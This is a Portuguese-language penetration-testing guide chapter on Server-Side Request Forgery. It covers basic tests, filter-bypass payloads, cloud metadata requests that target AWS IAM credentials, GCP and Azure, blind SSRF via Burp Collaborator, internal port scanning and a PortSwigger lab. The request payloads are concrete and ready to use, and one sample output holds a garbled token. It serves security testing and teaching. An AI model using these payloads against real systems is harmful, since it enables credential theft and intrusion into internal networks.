# Fase 6: Server-Side Request Forgery (SSRF)

**Tempo estimado:** 45-60 minutos
**Objetivo:** Testar se a aplicação aceita URLs e faz requests para locais não autorizados, expondo rede interna, cloud metadata e portas internas.
**Por quê:** SSRF é uma das vulnerabilidades mais devastadoras em ambientes cloud. Um SSRF bem explorado pode roubar credenciais AWS/GCP/Azure e mapear toda a rede interna.

---

## O que é SSRF?

Imagine que você pede para alguém mandar uma carta para um endereço. Se essa pessoa aceita qualquer endereço e você pede para ela enviar para "Caixa 3, Departamento de Ti, Sala 101", ela vai lá, pega o que está lá, e traz para você. É exatamente isso que SSRF faz com o servidor.

**Cenários típicos:**
- Endpoint que busca imagens de URLs: `GET /api/fetch?url=...`
- Import de feeds RSS: `POST /api/import { "feed_url": "..." }`
- Webhook de notificações: `POST /api/webhook { "url": "..." }`
- Upload de imagem via URL: `POST /api/avatar { "image_url": "..." }`

---

## 6A.1 — Teste Básico de SSRF

**O que você vai fazer:** Verificar se a aplicação aceita URLs e faz requests para elas no lado do servidor.

**No Burp Repeater:**
```http
GET /api/fetch?url=http://127.0.0.1 HTTP/1.1
Host: target.com
```

**✅ Output esperado (VULNERÁVEL):**
```
HTTP/1.1 200 OK
{"response": "HTTP/1.1 200 OK\nServer: nginx/1.18.0\n..."}
```

**O que procurar:** A resposta contém informações do servidor INTERNO (headers, versão, conteúdo). Isso confirma que o servidor fez um request para `127.0.0.1` e retornou a resposta.

**✅ Output esperado (NÃO vulnerável):**
```
HTTP/1.1 400 Bad Request
{"error": "Invalid URL"}
```
ou
```
HTTP/1.1 200 OK
{"response": "Connection refused"}
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna erro 400 | Validação de URL | Tente bypass de filtros (Passo 6A.3) |
| Retorna "Connection refused" | Porta fechada | Teste outras portas (Passo 6A.6) |
| Não há parâmetro de URL | App não usa URLs | Procure outros endpoints que aceitam URL |

### Passo 6A.2 — SSRF via POST

```http
POST /api/import HTTP/1.1
Host: target.com
Content-Type: application/json

{
  "url": "http://127.0.0.1"
}
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna erro | JSON inválido | Verifique Content-Type e formatação |
| `url` não é aceito | Campo não existe | Procure outros campos: `feed_url`, `image_url`, `webhook_url` |

---

## 6A.3 — Bypass de Filtros SSRF

**O que você vai fazer:** Testar técnicas de bypass quando o servidor filtra `127.0.0.1` ou `localhost`.

### Bypass via IP alternativo

```http
# IP decimal (127.0.0.1 = 2130706433)
GET /api/fetch?url=http://2130706433 HTTP/1.1

# IPv6
GET /api/fetch?url=http://[::1] HTTP/1.1

# IP alternativo
GET /api/fetch?url=http://0177.0.0.1 HTTP/1.1
GET /api/fetch?url=http://0x7f000001 HTTP/1.1
GET /api/fetch?url=http://127.1 HTTP/1.1
```

### Bypass via DNS Rebinding

```http
GET /api/fetch?url=http://localtest.me HTTP/1.1
```

`localtest.me` resolve para `127.0.0.1` mas passa em filtros de DNS.

### Bypass via Redirect

```http
GET /api/fetch?url=http://httpbin.org/redirect-to?url=http://127.0.0.1 HTTP/1.1
```

O servidor faz request para `httpbin.org` (que é aceito), e o redirect leva para `127.0.0.1`.

### Bypass via URL Encoding

```http
GET /api/fetch?url=http://127.0.0.1%0d%0a HTTP/1.1
```

### Bypass viaIPv6 e variações

```http
GET /api/fetch?url=http://[0:0:0:0:0:0:0:1] HTTP/1.1
GET /api/fetch?url=http://[::ffff:127.0.0.1] HTTP/1.1
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todos bloqueados | WAF robusto | Tente Blind SSRF (Passo 6A.5) |
| Redirect não funciona | App não segue redirects | Use Out-of-Band via DNS |

---

## 6A.4 — Cloud Metadata (SSRF de Alto Impacto)

**O que você vai fazer:** Acessar metadados de instâncias cloud (AWS, GCP, Azure) que podem conter credenciais de acesso.

### AWS Metadata

```http
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/ HTTP/1.1
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME HTTP/1.1
```

**✅ Output esperado (AWS VULNERÁVEL — listar metadados):**
```
HTTP/1.1 200 OK
ami-id
hostname
instance-id
instance-type
local-ipv4
```

**✅ Output esperado (AWS VULNERÁVEL — IAM credentials):**
```
HTTP/1.1 200 OK
AKIAIOSFODNN7EXAMPLE
[w秘文]
us-east-1
```

**O que procurar:** Se retornou AKIA... (Access Key ID) → você tem credenciais AWS completas → pode assumir a role da instância.

### GCP Metadata

```http
GET /api/fetch?url=http://metadata.google.internal/computeMetadata/v1/ HTTP/1.1
Host: target.com
Metadata-Flavor: Google
```

### Azure Metadata

```http
GET /api/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01 HTTP/1.1
Metadata: true
```

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Retorna 404 | Endpoint não existe | Não é cloud ou metadata desabilitada |
| Retorna timeout | Firewall bloqueia 169.254.169.254 | Tente Blind SSRF (Passo 6A.5) |
| Retorna 403 | IMDSv2 obrigatório (AWS) | Tente via redirect ou header customizado |

---

## 6A.5 — SSRF Blind (Out-of-Band)

**O que você vai fazer:** Detectar SSRF quando a resposta NÃO é retornada ao cliente.

1. No Burp, vá para **Collaborator** → clique **Copy to clipboard** para obter URL
2. Substitua `COLLABORATOR_ID` no payload:

```http
GET /api/ping?host=COLLABORATOR_ID.burpcollaborator.net HTTP/1.1
Host: target.com
```

3. Volte ao **Collaborator** → clique **Poll now**
4. Se houver conexão → **Blind SSRF confirmado**

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Collaborator não recebe nada | DNS não resolve | Verifique se o Collaborator está ativo |
| WAF bloqueia domínio externo | Filtro de domínio | Use subdomínio do próprio target |

---

## 6A.6 — Port Scanning via SSRF

```http
GET /api/fetch?url=http://127.0.0.1:22 HTTP/1.1
GET /api/fetch?url=http://127.0.0.1:80 HTTP/1.1
GET /api/fetch?url=http://127.0.0.1:443 HTTP/1.1
GET /api/fetch?url=http://127.0.0.1:3306 HTTP/1.1
GET /api/fetch?url=http://127.0.0.1:6379 HTTP/1.1
```

**O que procurar:** Respostas diferentes indicam portas abertas/fechadas internamente.

| Porta | Serviço | Impacto |
|-------|---------|---------|
| 22 | SSH | Acesso remoto |
| 80/443 | HTTP/HTTPS | Web server interno |
| 3306 | MySQL | Banco de dados |
| 6379 | Redis | Cache (possível RCE) |
| 8080 | Tomcat | Java server |
| 9200 | Elasticsearch | Dados expostos |

**❌ Se der errado:**
| Problema | Causa | Alternativa |
|----------|-------|-------------|
| Todas retornam igual | Timeout padrão igual | Meça tempo de resposta (timing) |
| Porta fechada retorna erro | Server valida resposta | Tente via Blind SSRF |

---

## Checklist de SSRF

| # | Item | Arquivo gerado | ☑ |
|---|------|---------------|:---:|
| 1 | SSRF testado em parâmetros de URL | `relatorio/ssrf-test.txt` | [ ] |
| 2 | SSRF bypass testado | `relatorio/ssrf-bypass.txt` | [ ] |
| 3 | Cloud metadata testado | `relatorio/ssrf-cloud.txt` | [ ] |
| 4 | SSRF blind testado | `relatorio/ssrf-blind.txt` | [ ] |
| 5 | Port scanning via SSRF | `relatorio/ssrf-ports.txt` | [ ] |

### ✅ Sinal de sucesso:
- **SSRF confirmado** (acesso a rede interna ou cloud metadata)
- **Portas internas mapeadas** via SSRF
- **Blind SSRF** confirmado via Out-of-Band

### ❌ Se falhou:
- SSRF pode ter validação de URL → teste bypass
- Se não há endpoint com parâmetro URL → SSRF não é possível neste alvo

### 🔗 O que deste arquivo alimenta nas próximas fases:
| Arquivo da Fase 6 | Usado na Fase | Para quê |
|--------------------|---------------|----------|
| `ssrf-cloud.txt` | Fase 11 (Validação) | Confirmar acesso a cloud metadata |
| `ssrf-ports.txt` | Fase 12 (Relatório) | Documentar rede interna mapeada |
| `ssrf-blind.txt` | Fase 12 (Relatório) | Documentar confirmação out-of-band |

**Se completou tudo → Avance para Fase 7** (`07-xxe.md`)

---

## Mini-Checkpoint: Lab SSRF

1. Acesse o lab "Basic SSRF against the local server" no PortSwigger: https://portswigger.net/web-security/server-side-request-forgery/lab-basic-ssrf-against-the-local-server
2. Use Burp Repeater para enviar `http://127.0.0.1/admin`
3. Confirme que o servidor acessou o painel admin internamente
4. Encontre o endpoint de delete do admin e execute via SSRF

Se conseguiu → avance. Se não → revise os bypass de filtros na seção 6A.3.
